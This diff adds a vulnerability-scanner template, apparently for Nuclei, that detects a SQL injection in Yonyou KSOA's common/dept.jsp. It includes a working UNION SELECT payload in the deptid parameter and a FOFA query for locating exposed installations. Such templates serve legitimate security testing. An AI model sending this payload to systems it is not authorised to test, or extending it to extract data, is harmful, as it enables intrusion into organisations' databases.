@@ -1,0 +1,36 @@
+http:
+- matchers:
+  - part: body
+    type: word
+    words:
+    - 0x{{md5({{num}})}}
+  - status:
+    - 200
+    type: status
+  matchers-condition: and
+  method: GET
+  path:
+  - '{{BaseURL}}/common/dept.jsp?deptid=1''+UNION+ALL+SELECT+60%2Csys.fn_sqlvarbasetostr(HASHBYTES(''MD5''%2C''{{num}}''))--+'
+id: yonyou-ksoa-dept-sqli
+info:
+  author: DhiyaneshDK
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 10
+    cwe-id: CWE-89
+  description: 'Yonyou KSOA contains a SQL injection vulnerability. An attacker can
+    possibly obtain sensitive information from a database, modify data, and execute
+    unauthorized administrative operations in the context of the affected site.
+
+    '
+  metadata:
+    fofa-query: "app=\"\u7528\u53CB-\u65F6\u7A7AKSOA\""
+    max-request: 1
+    verified: true
+  name: YonYou KSOA common/dept.jsp - SQL injection
+  reference:
+  - https://mp.weixin.qq.com/s/I6aG2vFIi5nbVZfuVNpyDw
+  severity: critical
+  tags: yonyou,oa,sqli,ksoa
+variables:
+  num: '999999999'
